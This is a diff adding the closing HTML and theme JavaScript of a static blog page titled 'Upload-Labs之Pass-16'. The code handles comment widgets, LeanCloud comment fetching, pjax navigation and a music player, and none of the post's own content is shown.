+    ele.rel = 'stylesheet'
+    ele.href= 'https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css'
+    document.getElementsByTagName('head')[0].appendChild(ele)
+  }
+
+  function initDisqusjs () {
+    window.DISQUS = null
+    new DisqusJS({
+      shortname: 'guobang',
+      siteName: '',
+      identifier: '2020/Upload-Labs4/',
+      url: 'https://braindance.tk/2020/Upload-Labs4/',
+      title: 'Upload-Labs之Pass-16',
+      api: 'https://disqus.skk.moe/disqus/',
+      apikey: 'MlH1lRgc25AEM0QeHiPNOG9g4FswxAWFmhKhaW2YjrKDznnLBMwC9i3lHLJPABi3',
+      nocomment: '',
+      admin: '',
+      adminLabel: ''
+    });
+  }
+
+  window.disqusReset = initDisqusjs
+
+  if (window.disqusJsLoad) initDisqusjs()
+  else {
+    addDisqusjsCSS()
+    $.getScript('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', initDisqusjs)
+    window.disqusJsLoad = true
+  }
+}
+
+if ('Valine' === 'Disqusjs' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqusjs)
+  else loadDisqusjs()
+}
+else {
+  function loadOtherComment () {
+    loadDisqusjs()
+  }
+}
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+    content = content.replace(/(http(s?):)([/|.|\w|\s|-])*\.(?:jpg|jpeg|gif|png|webp)/g, '') // remove image link
+    content = content.replace(/(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gi, '') // remove url
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon 
+    let defaultIcon = '?d=mp'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    for (let i = 0; i < array.length; i++) {
+      result += '<div class=\'aside-list-item\'>'
+
+      if (true) {
+        result += `<a href='${array[i].url}' class="thumbnail"><img src='${getIcon(array[i].avatar, array[i].mail)}' alt='${array[i].nick}'></a>`
+      }
+
+      result += `<div class='content'>
+      <a class='comment' href='${array[i].url}'>${array[i].content}</a>
+      <div class='name'><span>${array[i].nick}</span><time> / ${btf.diffDate(array[i].date, true)}</time></div>
+      </div></div>`
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getValineData = () => {
+      let serverURL = ''
+      if (false) {
+        serverURL = ''
+      } else {
+        serverURL = 'https://shaenDlk.api.lncldglobal.com'
+      }
+
+    var settings = {
+      "url": `${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,
+      "method": "GET",
+      "timeout": 0,
+      "headers": {
+        "X-LC-Id": 'shaenDlkzwy9NvdCNJVrJspu-MdYXbMMI',
+        "X-LC-Key": 'e074xMKoSw3B9kWmBediaBE9',
+        "Content-Type": "application/json"
+      },
+    }
+
+    $.ajax(settings).done((response) => {
+      var valineArray = []
+      response.results.forEach((e)=>{
+        valineArray.push({
+          'avatar': e.QQAvatar,
+          'content': changeContent(e.comment),
+          'mail': e.mail,
+          'nick': e.nick,
+          'url': e.url,
+          'date': e.createdAt,
+        })
+      })
+      
+      saveToLocal.set('leancloud-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+      generateHtml(valineArray)
+
+    }).fail(()=>{
+      const $dom = document.querySelector('#card-newest-comments .aside-list')
+      $dom.innerHTML= "无法获取资料，请确认相关配置是否正确"
+    })
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('leancloud-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getValineData()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config_change',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  $('script[data-pjax]').each(function () {
+    $(this).parent().append($(this).remove())
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  if (typeof gtag === 'function') {
+    gtag('config', '', {'page_path': window.location.pathname});
+  }
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+
+document.addEventListener('pjax:send', function () {
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  $(window).off('scroll')
+
+  //reset readmode
+  $('body').hasClass('read-mode') && $('body').removeClass('read-mode')
+
+})</script></div></body></html>
